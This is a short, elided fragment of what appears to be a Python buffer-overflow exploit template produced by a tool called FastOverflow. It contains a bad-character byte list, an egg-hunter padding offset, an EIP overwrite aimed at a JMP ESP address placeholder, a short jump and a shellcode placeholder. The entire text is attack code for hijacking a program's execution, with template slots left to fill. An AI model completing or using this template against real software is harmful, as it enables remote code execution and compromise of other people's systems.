# This exploit was generated by FastOverflow and it can runs over Python 2 and 3!
...
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42"
...
offset = "A" * ({{{OFFSET}}} - len(hunter)) + hunter

eip = pack('<L', 0x{{{JMPESP_ADD}}})
jmp_short = {{{JMP_SHORT}}}

shellcode = b"{{{EGG}}}"

buffer = offset.encode("latin-1") + eip + jmp_short
